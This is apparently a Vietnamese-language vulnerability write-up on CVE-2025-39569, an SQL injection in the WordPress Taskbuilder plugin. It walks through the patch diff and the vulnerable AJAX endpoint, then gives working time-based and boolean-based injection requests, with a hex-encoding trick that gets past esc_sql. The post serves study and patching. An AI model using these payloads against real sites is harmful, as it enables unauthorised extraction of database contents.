# CVE-2025-39569 Analysis & POC


<!--more-->

Lỗ hổng xảy ra trên plugin **Taskbuilder** của WordPress trước phiên bản **4.0.2**. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.

* **CVE ID**: [CVE-2025-39569](https://www.cve.org/CVERecord?id=CVE-2025-39569)
* **Product**: [WordPress Hostel Plugin](https://wordpress.org/plugins/taskbuilder/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: < 4.0.2
* **CVSS severity**: High (8.5)
* **Required Privilege**: Subscriber

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Taskbuilder Plugin**:  v4.0.1(vul) và v4.0.2(fix)
* **diff tool**: **meld** hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version

## Analysis

Ứng dụng đã **xử lý dữ liệu đầu vào** trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn `'...'`. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như `OR`, `AND`,`...`) vào truy vấn, dẫn đến lỗ hổng SQL Injection.

### Patch Diff

Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file **includes/admin/projects/get_users.php**

Trong phiên bản **v4.0.1**, biến `$proj_id` sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh:

```php
$proj_id = esc_sql($proj_id);
$project = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wppm_project where id = $proj_id" );
```

Ở bản **v4.0.2**, truy vấn đã được điều chỉnh bằng cách đặt `$proj_id` trong dấu nháy đơn sau khi escape:

```php
$proj_id = esc_sql($proj_id);
$project = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}wppm_project where id = '$proj_id'" );
```

Bản vá này đảm bảo rằng giá trị `$proj_id` sau khi escape được coi là **một chuỗi literal**, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection.

{{< figure src="patch_diff.png" caption="Patch diff" alt="patch diff" >}}

### How it work?

**File architecture**:

Cấu trúc chung của file hiện tại

```php
$proj_id  = esc_sql($proj_id);
$project  = $wpdb->get_row("SELECT * FROM {$wpdb->prefix}wppm_project WHERE id = $proj_id");

// Bắt đầu buffer để tạo nội dung chính (body) của modal
ob_start();
// ... render HTML danh sách users
$body = ob_get_clean();

// Bắt đầu buffer để tạo phần footer của modal
ob_start();
// ... render HTML các nút thao tác (Close, Save)
$footer = ob_get_clean();

// Trả dữ liệu JSON để frontend hiển thị modal
echo json_encode([
    'body'   => $body,
    'footer' => $footer,
]);
```

* `$proj_id` / `$project`: Lấy dữ liệu project từ database.
* `ob_start()` / `ob_get_clean()`: Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến.
* `$body` / `$footer`: Chứa nội dung HTML động của modal.
* `json_encode()`: Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang.

File nằm trong thư mục `includes` cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa `get_users.php` trong thư mục chứa plugin.

{{< figure src="search_get_users.png" caption="Search users" alt="search get users" >}}

👉 Nó được include trong hàm `wppm_get_users()` của class `WPPM_Admin` trong file **class-wppm-admin.php**.
`wppm_get_users()` là **callback** của **action hook trong WordPress**.

**WPPM_Admin construct**:

```php
final class WPPM_Admin {
    // constructor
    public function __construct() {

        // other action

        add_action( 'wp_ajax_wppm_get_users',array($this,'wppm_get_users'));

        // array($this,'wppm_get_users')) = $this::wppm_get_users()
        // other action
    }
}
```

* `add_action()` là một **Plugin API** của WordPress, cho phép gắn một **callback** vào một **action hook**.
* `wp_ajax_wppm_get_users` là tên hook Ajax, với quy tắc đặt tên:

  * `wp_ajax_{action}` => Xử lý Ajax khi user đã đăng nhập.
  * `wp_ajax_nopriv_{action}` => Xử lý Ajax khi user chưa đăng nhập.
* Ở đây, `action = wppm_get_users`. Nghĩa là nếu trong Ajax request bạn gửi `action=wppm_get_users` tới `admin-ajax.php`, thì WordPress sẽ **tìm callback tương ứng để xử lý**, ở đây là `wppm_get_users()`.

👉 Ta đã biết được `action = wppm_get_users`, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa `wppm_get_users` trên các file **.js** trong thư mục chứa plugin.

{{< figure src="ajax_search.png" caption="Ajax search" alt="ajax search" >}}

Action `wppm_get_users` là phần data trong request POST của hàm `wppm_get_users()`

Hàm `wppm_get_users()` sẽ được đặt trong HTML attribute của **chức năng project**

* Tạo project mới
* Truy cập vào project đó
* Inspect code và tìm hàm `wppm_get_users` sẽ được đặt ở đâu, hành động nào sẽ gọi nó

{{< figure src="ajax_inspect.png" caption="Ajax inspect" alt="ajax inspect" >}}

👉 Khi click vào **icon bên cạnh Users** ajax sẽ hoạt động, gửi request đến server, lấy danh sách các user tham gia project và mã HTML hiển thị nó.

{{< figure src="model_display.png" caption="Model display" alt="model display" >}}

## Exploit

### Detect SQLi

Bắt request bằng BurpSuite, gửi request với SQLi payload **time base**

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+SLEEP(1))
```

{{< figure src="sqli_success.png" caption="Sqli success" alt="sqli success" >}}

Thời gian phản hồi bị delay => SQL Injection thành công.

### Get First Letter of Database Name

Điều kiện tiên quyết để **dump được hết data** là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.

Gửi request với SQLi payload **boolean base** vói `proj_id` đúng:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999))
```

> Database name được tôi đặt tên là **wordpress** nên kí tự đầu tiên là `w` tương ứng với mã HEX là `0x77`

Sử dụng `SUBSTRING(STRING,1,1)` để lấy kí tự đầu tiên của chuỗi

Ở đây, `$proj_id` bằng `4` vì `SUBSTRING('wordpress',1,1)=0x77` là đúng nên `SELECT` lấy giá trị đúng trong `IF(condition, value if true, value if false)`, `4` là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án

{{< figure src="res.png" caption="Res 1" alt="response 1" >}}

Sử dụng **HEX technique** để bypass hàm `esc_sql()` [ở trên](#patch-diff), dùng để so sánh khi không sử dùng được `'`

Gửi request với SQLi payload **boolean base** vói `proj_id` sai:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
action=wppm_get_users&proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4))
```

Với `proj_id` không có thực trong database, response sẽ trả về kết quả chứa `None`

{{< figure src="res_none.png" caption="Res 2" alt="response 2" >}}

👉 Ta đã lấy được kí tự đầu tiên của database name bằng kỹ thuật **boolean base**

* `proj_id` đùng: response không chứa None
* `proj_id` sai: response chứa None

> Có thể sử dụng kỹ thuật **time base** nhưng khi dump số lượng lớn data, thời gian dump sẽ rất lâu

## Conclusion

Lỗ hổng **CVE-2025-39569** trong plugin **WordPress Taskbuilder** xuất phát từ việc thiếu dấu nháy đơn `'...'` bao quanh dữ liệu đầu vào trong câu lệnh SQL, khiến dữ liệu người dùng có thể được diễn giải như một phần của câu lệnh SQL hợp lệ.

Bản vá ở phiên bản **4.0.2** đã khắc phục vấn đề bằng cách đưa `$proj_id` vào trong `'...'`, đảm bảo nó luôn được xử lý như một literal string trong SQL.

**Key takeaways**:

* Ưu tiên sử dụng **prepared statements** (`$wpdb->prepare()` trong WordPress) thay vì tự chèn dữ liệu vào query.
* Đối với các plugin WordPress, cần test kỹ lưỡng **các Ajax endpoint** vì đây là nơi dễ xuất hiện SQLi và XSS nhất.
* Người quản trị cần thường xuyên cập nhật plugin/theme để nhận bản vá kịp thời.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Taskbuilder project mnagement tool Plugin <= 4.0.1 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/taskbuilder/vulnerability/wordpress-taskbuilder-4-0-1-sql-injection-vulnerability?_s_id=cve)


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-09-22-cve-2025-39569/  

